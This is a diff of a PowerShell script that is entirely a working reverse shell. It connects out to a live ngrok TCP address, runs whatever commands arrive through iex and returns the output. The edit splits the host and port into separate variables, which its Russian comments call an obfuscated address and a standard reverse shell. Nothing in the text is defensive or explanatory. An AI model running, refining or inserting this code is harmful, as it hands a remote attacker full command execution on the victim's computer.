@@ -1,13 +1,18 @@
-$addr = '6.tcp.ngrok.io:17353'
-$c = New-Object System.Net.Sockets.TCPClient($addr.Split(':')[0], [int]$addr.Split(':')[1]);
-$s = $c.GetStream();
-[byte[]]$b = 0..65535|%{0};
-while(($i = $s.Read($b,0,$b.Length)) -ne 0){
-    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
-    $sb = (iex $d 2>&1 | Out-String);
-    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
-    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
-    $s.Write($sbt,0,$sbt.Length);
+# Блок 1: обфусцированный адрес (ngrok)
+$h='6.tcp.ngrok.io'
+$p='17353'
+$addr=$h+':'+$p
+
+# Блок 2: стандартный reverse-shell
+$c=New-Object Net.Sockets.TCPClient($addr.Split(':')[0], [int]$addr.Split(':')[1])
+$s=$c.GetStream()
+[byte[]]$b=0..65535|%{0}
+while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
+    $sb=(iex $d 2>&1|Out-String)
+    $sb2=$sb+'PS '+(pwd).Path+'> '
+    $sbt=([text.encoding]::ASCII).GetBytes($sb2)
+    $s.Write($sbt,0,$sbt.Length)
     $s.Flush()
 }
 $c.Close()
